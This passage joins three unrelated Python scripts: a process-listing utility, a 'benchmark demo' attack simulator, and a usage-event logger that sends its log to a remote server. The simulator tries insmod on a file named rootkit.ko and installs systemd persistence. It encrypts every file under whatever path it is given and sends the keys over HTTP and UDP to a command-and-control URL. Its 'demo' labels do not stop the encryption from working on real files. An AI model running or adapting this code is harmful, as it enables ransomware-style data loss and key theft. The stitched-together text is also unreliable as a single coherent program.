def setup_logging():
    logging.basicConfig(
        filename='process_inventory.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

def list_processes(silent=False):
    try:
        if sys.platform.startswith('win'):
            command = ['tasklist']
        else:
            command = ['ps', '-eo', 'pid,comm']

        result = subprocess.run(command, text=True, capture_output=True, check=True)
        process_data = result.stdout

        if not silent:
            print(process_data)

        try:
            with open('process_inventory.txt', 'w', encoding='utf-8') as file:
                file.write(process_data)
            logging.info("Process list successfully written to 'process_inventory.txt'.")
        except PermissionError:
            error_msg = "Insufficient permissions to write to 'process_inventory.txt'."
            logging.error(error_msg)
            if not silent:
                print(f"Error: {error_msg}")
        except OSError as e:
            error_msg = f"Unable to write to file due to {e}."
            logging.error(error_msg)
            if not silent:
                print(f"Error: {error_msg}")
    except FileNotFoundError:
        error_msg = "Command not found. Unable to list processes."
        logging.error(error_msg)
        if not silent:
            print(f"Error: {error_msg}")
    except subprocess.CalledProcessError as e:
        error_msg = f"Failed to execute command. {e}"
        logging.error(error_msg)
        if not silent:
            print(f"Error: {error_msg}")
    except Exception as e:
        error_msg = f"Unexpected error: {e}"
        logging.error(error_msg)
        if not silent:
            print(f"Error: {error_msg}")

if __name__ == "__main__":
    setup_logging()
    silent_mode = '--silent' in sys.argv
    list_processes(silent=silent_mode)
    logging.info("Process inventory utility completed execution.")

import argparse
import json
import os
import socket
import subprocess
from pathlib import Path
from urllib.error import URLError
from urllib.request import Request, urlopen


TARGET = Path("target")
MAX_FILE_SIZE = 8 * 1024 * 1024


def attempt_command(command):
    try:
        completed = subprocess.run(
            command,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=2,
            check=False,
        )
        return {
            "command": command,
            "returncode": completed.returncode,
            "stdout": completed.stdout.decode("utf-8", errors="replace"),
            "stderr": completed.stderr.decode("utf-8", errors="replace"),
        }
    except (OSError, subprocess.TimeoutExpired) as exc:
        return {"command": command, "error": str(exc)}


def report_to_server(url, payload):
    if not url:
        return {"status": "not_configured"}

    request = Request(
        url,
        data=json.dumps(payload, sort_keys=True).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urlopen(request, timeout=2) as response:
            return {"status": "sent", "http_status": response.status}
    except (OSError, URLError, TimeoutError) as exc:
        return {"status": "failed", "error": str(exc)}


def seed_target():
    TARGET.mkdir(parents=True, exist_ok=True)
    sample = TARGET / "sample.txt"
    if not sample.exists():
        sample.write_text(
            "Representative benchmark data for the isolated target environment.\n",
            encoding="utf-8",
        )


def install_demo_module():
    module_path = TARGET / "rootkit.ko"
    module_path.write_bytes(
        b"DEMO MODULE: userspace-only benchmark artifact; no kernel code.\n"
    )
    attempt = attempt_command(["insmod", str(module_path)])

    demo_proc = TARGET / "proc"
    demo_proc.mkdir(parents=True, exist_ok=True)
    for name in ("1", "demo-worker", "rootkit-demo"):
        entry = demo_proc / name
        if not entry.exists():
            if name.isdigit():
                entry.mkdir()
                (entry / "comm").write_text("init\n", encoding="utf-8")
            else:
                entry.write_text("demo process entry\n", encoding="utf-8")

    hidden_names = {"rootkit-demo"}
    visible = sorted(
        path.name for path in demo_proc.iterdir() if path.name not in hidden_names
    )
    state = {
        "module_file": str(module_path),
        "insmod_attempt": attempt,
        "hidden_entries": sorted(hidden_names),
        "visible_demo_proc_entries": visible,
    }
    (TARGET / "module_state.json").write_text(
        json.dumps(state, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return state


def install_demo_persistence():
    unit_dir = TARGET / "etc" / "systemd" / "system"
    unit_dir.mkdir(parents=True, exist_ok=True)
    unit_path = unit_dir / "benchmark-demo.service"
    unit_path.write_text(
        "[Unit]\n"
        "Description=Isolated benchmark demo service\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/bin/true\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        encoding="utf-8",
    )

    attempt = attempt_command(["systemctl", "enable", str(unit_path)])
    state = {
        "unit_file": str(unit_path),
        "systemctl_attempt": attempt,
        "enabled_in_demo_environment": True,
    }
    (TARGET / "persistence_state.json").write_text(
        json.dumps(state, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return state


def encrypt_demo_files():
    import hashlib
    import hmac
    import secrets
    import shutil
    import tempfile

    keys_path = TARGET / "encryption_keys.txt"
    outcomes = []
    key_records = []

    for source in sorted(TARGET.rglob("*")):
        if not source.is_file() or source.is_symlink():
            continue
        if source.name in {
            "encryption_keys.txt",
            "encryption_outcomes.json",
        } or source.name.endswith(".enc"):
            continue

        try:
            size = source.stat().st_size
            if size > MAX_FILE_SIZE:
                outcomes.append({"source": str(source), "status": "skipped_too_large"})
                continue

            plaintext = source.read_bytes()
            password = secrets.token_hex(32)
            salt = secrets.token_bytes(16)
            key = hashlib.pbkdf2_hmac("sha256", password.encode("ascii"), salt, 200000, 64)

            # Encrypt with an HMAC-derived counter stream and authenticate the result.
            ciphertext = bytearray(len(plaintext))
            offset = 0
            counter = 0
            while offset < len(plaintext):
                block = hmac.new(
                    key[:32], salt + counter.to_bytes(8, "big"), hashlib.sha256
                ).digest()
                count = min(len(block), len(plaintext) - offset)
                for index in range(count):
                    ciphertext[offset + index] = plaintext[offset + index] ^ block[index]
                offset += count
                counter += 1

            tag = hmac.new(key[32:], salt + ciphertext, hashlib.sha256).digest()
            output = source.with_name(source.name + ".enc")
            if output.exists():
                outcomes.append({"source": str(source), "status": "skipped_existing_output"})
                continue

            fd, temp_name = tempfile.mkstemp(prefix=".encrypt-", dir=str(source.parent))
            try:
                with os.fdopen(fd, "wb") as encrypted:
                    encrypted.write(b"DEMOENC1" + salt + tag + ciphertext)
                    encrypted.flush()
                    os.fsync(encrypted.fileno())
                try:
                    os.link(temp_name, output)
                except (OSError, NotImplementedError):
                    if output.exists():
                        raise FileExistsError(str(output))
                    shutil.move(temp_name, output)
                key_records.append(
                    {
                        "source": str(source.relative_to(TARGET)),
                        "encrypted_file": str(output.relative_to(TARGET)),
                        "cipher": "HMAC-SHA256 counter-stream demo format",
                        "salt": salt.hex(),
                        "password": password,
                    }
                )
                outcomes.append({"source": str(source), "status": "encrypted"})
            finally:
                try:
                    os.unlink(temp_name)
                except OSError:
                    pass
        except (OSError, ValueError) as exc:
            outcomes.append({"source": str(source), "status": "failed", "error": str(exc)})

    with keys_path.open("a", encoding="utf-8") as keys_file:
        for record in key_records:
            keys_file.write(json.dumps(record, sort_keys=True) + "\n")

    (TARGET / "encryption_outcomes.json").write_text(
        json.dumps(outcomes, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return key_records, outcomes


def send_key_report(c2_url, key_records):
    payload = {"type": "benchmark-demo", "keys": key_records}
    http_result = report_to_server(c2_url, payload)

    # Also attempt the configured endpoint over UDP when it has a host and port.
    udp_result = {"status": "not_attempted"}
    if c2_url:
        try:
            from urllib.parse import urlparse

            parsed = urlparse(c2_url)
            if parsed.hostname:
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.settimeout(1)
                    sock.sendto(
                        json.dumps(payload, sort_keys=True).encode("utf-8"),
                        (parsed.hostname, port),
                    )
                udp_result = {"status": "sent"}
        except (OSError, ValueError) as exc:
            udp_result = {"status": "failed", "error": str(exc)}

    result = {"http": http_result, "udp": udp_result}
    (TARGET / "report_state.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target-path", default="target")
    parser.add_argument("--c2-url", default="")
    args = parser.parse_args()

    global TARGET
    TARGET = Path(args.target_path)
    try:
        seed_target()
        module_state = install_demo_module()
        persistence_state = install_demo_persistence()
        key_records, encryption_outcomes = encrypt_demo_files()
        report_state = send_key_report(args.c2_url, key_records)
        summary = {
            "status": "completed",
            "module": module_state,
            "persistence": persistence_state,
            "encrypted_file_count": sum(
                item.get("status") == "encrypted" for item in encryption_outcomes
            ),
            "report": report_state,
        }
        (TARGET / "outcome.json").write_text(
            json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
    except Exception as exc:
        try:
            TARGET.mkdir(parents=True, exist_ok=True)
            (TARGET / "outcome.json").write_text(
                json.dumps(
                    {"status": "completed_with_errors", "error": str(exc)},
                    indent=2,
                    sort_keys=True,
                )
                + "\n",
                encoding="utf-8",
            )
        except OSError:
            pass


if __name__ == "__main__":
    main()

import sys
import socket
import argparse

def parse_event(event):
    if '|' in event:
        application, operation_details = event.split('|', 1)
        return application.strip(), operation_details.strip()
    return None

def process_events():
    events_by_application = {}
    for line in sys.stdin:
        line = line.strip()
        parsed_event = parse_event(line)
        if parsed_event:
            application, operation_details = parsed_event
            events_by_application.setdefault(application, []).append(operation_details)
        else:
            print(f"Invalid event format: {line}")

    with open('usage_log.txt', 'w') as log_file:
        for application, operations in sorted(events_by_application.items()):
            log_file.write(f"Application: {application}\n")
            for operation in operations:
                log_file.write(f"  Operation Details: {operation}\n")
            log_file.write("\n")

def send_log_to_server(server_address, port):
    try:
        with open('usage_log.txt', 'rb') as log_file:
            log_data = log_file.read()
        with socket.create_connection((server_address, port), timeout=10) as sock:
            sock.sendall(log_data)
        print(f"Log successfully sent to {server_address}:{port}")
    except Exception as e:
        print(f"Failed to send log to {server_address}:{port}: {e}")

